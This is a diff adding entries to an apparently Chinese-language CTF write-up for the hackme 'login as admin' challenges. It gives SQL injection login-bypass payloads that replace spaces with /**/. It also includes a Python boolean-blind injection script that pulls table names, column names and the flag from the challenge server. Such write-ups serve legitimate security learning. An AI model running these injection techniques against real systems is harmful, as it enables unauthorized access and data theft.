@@ -104,6 +104,44 @@ $_POST = array_map(safe_filter, $_POST);
 
 ```admin\' union select 1,group_concat(the_f14g),3,4 FROM h1dden_f14g#```
 
+## 22 login as admin 1
+要以isadmin為True的狀態登入，然後此題的空白字元會被限制，可以使用\"/\*\*/\"來繞過。
+
+可輸入"admin\\'or\/\*\*\/isadmin#"來進行登入
+
+## 22 login as admin 1.2
+先使用 order by確定查詢的column數"aaa\\'/\*\*/or/\*\*/isadmin/\*\*/order/\*\*/by/\*\*/4#"
+
+然後isadmin位於第四個欄位，所以接著於第四個使用boolean injection來爆出table name
+```python=
+import requests
+table = ''
+query = r"aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(table_name),{},1))={}/**/from/**/information_schema.tables/**/where/**/table_schema=database()#"
+
+for pos in range(50):
+    for char in range(32, 127):
+        post = {"name": query.format(pos, char), "password": "123"}
+        ret = requests.post("https://ctf.hackme.quest/login1/", post).text
+
+        if "You are admin!" in ret:
+            table += chr(char)
+            print(chr(char), end='')
+            break
+print(table)
+# 0bdb54c98123f5526ccaed982d2006a9,users
+```
+
+接下來來爆出column name
+```python=
+query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(column_name),{},1))={}/**/from/**/information_schema.columns/**/where/**/table_name="0bdb54c98123f5526ccaed982d2006a9"#'
+#4a391a11cfa831ca740cf8d00782f3a6,id
+```
+
+最後爆出flag
+```python=
+query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(4a391a11cfa831ca740cf8d00782f3a6),{},1))={}/**/from/**/0bdb54c98123f5526ccaed982d2006a9#'
+```
+
 
 
 
